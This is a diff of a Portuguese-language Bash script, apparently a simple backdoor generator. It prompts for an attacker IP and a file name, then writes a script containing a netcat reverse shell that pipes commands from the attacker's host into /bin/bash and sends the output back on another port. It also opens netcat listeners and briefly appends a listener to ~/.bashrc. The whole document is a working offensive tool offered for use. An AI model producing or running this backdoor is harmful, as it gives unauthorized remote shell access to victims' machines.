@@ -1,6 +1,8 @@
 #!/bin/bash
 # Developer: Derxs
-# Version: 1.1
+# Version: 1.0
+if [ `whoami` == 'root' ];
+then
 Menu(){
 clear
 sleep 2
@@ -38,33 +40,40 @@ MM      MMMMMMMMMMMMMMMMMMM    M
 MMM   MMMMMMMMMMMMMMMMMMMMMM   M
 MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
 "
+sleep 2
 echo -n "[+] Digite o seu IP: "
 read ip
 if [ "$ip" == "" ];
-  then
-	  echo "[!] Você precisa digitar o seu número de IP!"
-	  sleep 3
-	  Menu
+then
+	echo "[!] Você precisa digitar o seu número de IP!"
+	sleep 4
+	Menu
 else
 	echo -n "[+] Digite o nome para a backdoor: "
 	read nome
 	if [ "$nome" == "" ];
-	  then
-		  echo "[!] Você precisa digitar um nome!"
-		  sleep 3
-		  Menu
+	then
+		echo "[!] Você precisa digitar um nome!"
+		sleep 4
+		Menu
 	else
-		  sudo echo "#!/bin/bash" >> $nome.sh
-		  sudo echo "nc $ip 53 | /bin/bash | nc $ip 79" >> $nome.sh
-		  sudo chmod 777 $nome.sh
-		  clear
-		  echo "[+] Backdoor criada com sucesso!"
-		  sleep 2
-		  sudo echo nc -l -n -p 79 -vv >> ~/.bashrc
-		  sudo gnome-terminal
-		  sudo sed -i '/nc -l -n -p 79/d' ~/.bashrc
-		  sudo nc -l -n -p 53 -vv
-	 fi
+		echo "#!/bin/bash" >> $nome.sh
+		echo "nc $ip 53 | /bin/bash | nc $ip 79" >> $nome.sh
+		chmod 777 $nome.sh
+		clear
+		echo "[+] Backdoor criada com sucesso!"
+		sleep 2
+		echo nc -l -n -p 79 -vv >> ~/.bashrc
+		x-terminal-emulator
+		sed -i '/nc -l -n -p 79/d' ~/.bashrc
+		nc -l -n -p 53 -vv
+	fi
 fi
 }
 Menu
+else
+	echo ""
+    	echo "[!] Por favor execute o script como root!"
+	echo ""
+	exit
+fi
